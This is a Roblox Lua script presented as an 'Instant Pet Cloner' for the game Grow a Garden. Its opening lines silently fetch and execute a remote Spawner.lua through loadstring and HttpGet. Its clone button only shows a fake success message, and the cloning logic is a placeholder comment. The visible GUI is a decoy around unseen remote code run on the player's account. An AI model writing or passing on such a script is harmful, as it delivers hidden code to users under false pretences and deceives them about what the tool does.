-- Instant Pet Cloner GUI - Grow a Garden Style üå±

-- Load Spawner silently
local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
Spawner.Load = function() end
pcall(function() Spawner.Load() end)

-- Services
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- Cleanup old GUI
local GUI_NAME = "KitsuClonerUI"
if PlayerGui:FindFirstChild(GUI_NAME) then
	PlayerGui[GUI_NAME]:Destroy()
end

-- GUI Setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = GUI_NAME
screenGui.Parent = PlayerGui
screenGui.ResetOnSpawn = false

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 350, 0, 420)
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -210)
mainFrame.BackgroundColor3 = Color3.fromRGB(90, 45, 20)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 10)
frameCorner.Parent = mainFrame

-- Title Bar
local titleBar = Instance.new("TextLabel")
titleBar.Size = UDim2.new(1, 0, 0, 40)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(50, 130, 40)
titleBar.Text = "Instant Pet Cloner"
titleBar.Font = Enum.Font.FredokaOne
titleBar.TextSize = 20
titleBar.TextColor3 = Color3.new(1, 1, 1)
titleBar.TextXAlignment = Enum.TextXAlignment.Left
titleBar.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 10)
titleCorner.Parent = titleBar

-- Close Button
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 28, 0, 28)
closeButton.Position = UDim2.new(1, -36, 0, 6)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
closeButton.Text = "X"
closeButton.Font = Enum.Font.GothamBold
closeButton.TextSize = 18
closeButton.TextColor3 = Color3.new(1, 1, 1)
closeButton.Parent = mainFrame
Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 6)

closeButton.MouseButton1Click:Connect(function()
	screenGui:Destroy()
end)

-- Dropdown for pet selection
local dropdown = Instance.new("TextBox")
dropdown.Size = UDim2.new(1, -20, 0, 40)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.PlaceholderText = "Type pet name here"
dropdown.Text = ""
dropdown.Font = Enum.Font.GothamBold
dropdown.TextSize = 16
dropdown.TextColor3 = Color3.new(1, 1, 1)
dropdown.BackgroundColor3 = Color3.fromRGB(120, 70, 40)
dropdown.Parent = mainFrame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Weight Input
local weightBox = Instance.new("TextBox")
weightBox.Size = UDim2.new(0.45, -15, 0, 35)
weightBox.Position = UDim2.new(0, 10, 0, 100)
weightBox.PlaceholderText = "Weight"
weightBox.Text = ""
weightBox.Font = Enum.Font.Gotham
weightBox.TextSize = 14
weightBox.TextColor3 = Color3.new(1, 1, 1)
weightBox.BackgroundColor3 = Color3.fromRGB(100, 60, 40)
weightBox.Parent = mainFrame
Instance.new("UICorner", weightBox).CornerRadius = UDim.new(0, 6)

-- Age Input
local ageBox = Instance.new("TextBox")
ageBox.Size = UDim2.new(0.45, -15, 0, 35)
ageBox.Position = UDim2.new(0.55, 5, 0, 100)
ageBox.PlaceholderText = "Age"
ageBox.Text = ""
ageBox.Font = Enum.Font.Gotham
ageBox.TextSize = 14
ageBox.TextColor3 = Color3.new(1, 1, 1)
ageBox.BackgroundColor3 = Color3.fromRGB(100, 60, 40)
ageBox.Parent = mainFrame
Instance.new("UICorner", ageBox).CornerRadius = UDim.new(0, 6)

-- Clone Button
local cloneButton = Instance.new("TextButton")
cloneButton.Size = UDim2.new(1, -20, 0, 40)
cloneButton.Position = UDim2.new(0, 10, 0, 150)
cloneButton.BackgroundColor3 = Color3.fromRGB(255, 180, 30)
cloneButton.Text = "CLONE PET"
cloneButton.Font = Enum.Font.GothamBold
cloneButton.TextSize = 16
cloneButton.TextColor3 = Color3.new(0, 0, 0)
cloneButton.Parent = mainFrame
Instance.new("UICorner", cloneButton).CornerRadius = UDim.new(0, 6)

-- Output/Feedback Label
local outputLabel = Instance.new("TextLabel")
outputLabel.Size = UDim2.new(1, -20, 0, 30)
outputLabel.Position = UDim2.new(0, 10, 0, 200)
outputLabel.BackgroundTransparency = 1
outputLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
outputLabel.Font = Enum.Font.Gotham
outputLabel.TextSize = 14
outputLabel.Text = ""
outputLabel.TextWrapped = true
outputLabel.Parent = mainFrame

-- Clone Logic
cloneButton.MouseButton1Click:Connect(function()
	local petName = dropdown.Text
	local weight = tonumber(weightBox.Text)
	local age = tonumber(ageBox.Text)

	if petName == "" or not weight or not age then
		outputLabel.Text = "‚ùå Fill all fields correctly."
		return
	end

	outputLabel.Text = "‚úÖ Cloned pet: " .. petName .. " (" .. weight .. "kg, " .. age .. "y)"
	-- Add your pet cloning logic here
end)
